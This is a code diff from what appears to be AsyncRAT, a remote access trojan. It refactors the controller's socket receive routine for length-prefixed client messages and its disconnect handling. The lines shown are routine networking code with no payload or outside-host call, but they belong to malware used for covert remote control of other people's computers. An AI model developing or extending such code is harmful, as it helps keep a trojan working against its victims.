@@ -39,52 +39,55 @@ namespace AsyncRAT_Sharp.Sockets
 
         public async void ReadClientData(IAsyncResult ar)
         {
-
             try
             {
-                int Recevied = client.EndReceive(ar);
-
-                if (Recevied > 0)
+                if (!client.Connected)
                 {
-
-                    if (BufferRecevied == false)
+                    Disconnected();
+                }
+                else
+                {
+                    int Recevied = client.EndReceive(ar);
+                    if (Recevied > 0)
                     {
-                        if (Buffer[0] == 0)
+                        if (BufferRecevied == false)
                         {
-                            Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
-                            MS.Dispose();
-                            MS = new MemoryStream();
-                            if (Buffersize > 0)
+                            if (Buffer[0] == 0)
                             {
-                                Buffer = new byte[Buffersize - 1];
-                                BufferRecevied = true;
+                                Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
+                                MS.Dispose();
+                                MS = new MemoryStream();
+                                if (Buffersize > 0)
+                                {
+                                    Buffer = new byte[Buffersize - 1];
+                                    BufferRecevied = true;
+                                }
+                            }
+                            else
+                            {
+                                await MS.WriteAsync(Buffer, 0, Buffer.Length);
                             }
                         }
                         else
                         {
-                            await MS.WriteAsync(Buffer, 0, Buffer.Length);
+                            await MS.WriteAsync(Buffer, 0, Recevied);
+                            if (MS.Length == Buffersize)
+                            {
+                                Read?.BeginInvoke(this, MS.ToArray(), null, null);
+                                Buffer = new byte[1];
+                                Buffersize = 0;
+                                BufferRecevied = false;
+                                MS.Dispose();
+                                MS = new MemoryStream();
+                            }
                         }
+                        client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
                     }
                     else
                     {
-                        await MS.WriteAsync(Buffer, 0, Recevied);
-                        if (MS.Length == Buffersize)
-                        {
-
-                            Read?.BeginInvoke(this, MS.ToArray(), null, null);
-                            Buffer = new byte[1];
-                            Buffersize = 0;
-                            BufferRecevied = false;
-                            MS.Dispose();
-                            MS = new MemoryStream();
-                        }
+                        Disconnected();
                     }
                 }
-                else
-                {
-                    Disconnected();
-                }
-                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
             }
             catch
             {
@@ -96,7 +99,7 @@ namespace AsyncRAT_Sharp.Sockets
         public void Disconnected()
         {
             if (Program.form1.listView1.InvokeRequired)
-                Program.form1.listView1.Invoke(new _isDisconnected(Disconnected));
+                Program.form1.listView1.BeginInvoke(new _isDisconnected(Disconnected));
             else
             {
                 LV.Remove();
